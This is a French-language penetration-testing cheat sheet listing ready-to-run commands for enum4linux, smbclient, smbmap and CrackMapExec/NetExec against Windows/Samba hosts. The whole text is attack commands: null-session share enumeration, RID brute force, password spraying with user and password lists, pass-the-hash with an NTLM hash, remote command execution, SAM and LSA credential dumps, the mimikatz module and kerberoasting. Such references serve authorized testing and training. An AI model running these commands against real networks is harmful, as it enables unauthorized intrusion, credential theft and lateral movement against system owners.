🔍 Enum4linux

Enum4linux — Énumération Samba/Windows
# Installation
sudo apt install enum4linux

# Scan complet
enum4linux -a 192.168.1.1

# Énumération ciblée
enum4linux -U 192.168.1.1   # Utilisateurs
enum4linux -S 192.168.1.1   # Partages (shares)
enum4linux -G 192.168.1.1   # Groupes
enum4linux -P 192.168.1.1   # Politique mots de passe
enum4linux -o 192.168.1.1   # Info OS
enum4linux -r 192.168.1.1   # RID brute force (users)

# Avec credentials
enum4linux -u admin -p password -a 192.168.1.1

# Enum4linux-ng (version moderne)
enum4linux-ng -A 192.168.1.1
enum4linux-ng -As 192.168.1.1 -u admin -p password

📁 SMBclient & SMBmap

SMB — Partages et accès
# Lister les partages (null session)
smbclient -L \\\\192.168.1.1 -N
smbclient -L //192.168.1.1 -N   # Syntaxe alternative

# Connexion à un partage
smbclient \\\\192.168.1.1\\SHARE -U admin
smbclient \\\\192.168.1.1\\SHARE -N   # Null session

# Commandes dans smbclient
smb> ls              # Lister les fichiers
smb> cd dossier      # Naviguer
smb> get fichier.txt # Télécharger
smb> put local.txt   # Uploader
smb> exit

# SMBmap — cartographier les accès
smbmap -H 192.168.1.1                          # Null session
smbmap -H 192.168.1.1 -u admin -p password    # Authentifié
smbmap -H 192.168.1.1 -u admin -p password -r SHARE   # Lister récursivement
smbmap -H 192.168.1.1 --download SHARE/secret.txt      # Télécharger

⚡ CrackMapExec (CME / NetExec)

CrackMapExec
# Installation
sudo apt install crackmapexec
pip3 install netexec   # Successeur moderne (nxc)

# Énumération SMB
crackmapexec smb 192.168.1.0/24
crackmapexec smb 192.168.1.1 -u admin -p password

# Tester des credentials sur un réseau
crackmapexec smb 192.168.1.0/24 -u admin -p password
crackmapexec smb 192.168.1.1 -u users.txt -p passwords.txt

# Pass-the-Hash
crackmapexec smb 192.168.1.1 -u admin -H NTLM_HASH

# Exécuter des commandes
crackmapexec smb 192.168.1.1 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.1 -u admin -p password -X "Get-Process"  # PowerShell

# Dump SAM / LSA
crackmapexec smb 192.168.1.1 -u admin -p password --sam
crackmapexec smb 192.168.1.1 -u admin -p password --lsa

# Partages
crackmapexec smb 192.168.1.1 -u admin -p password --shares

# Modules
crackmapexec smb 192.168.1.1 -u admin -p password -M mimikatz

# Kerberoasting via CME
crackmapexec ldap 192.168.1.1 -u admin -p password --kerberoasting output.txt
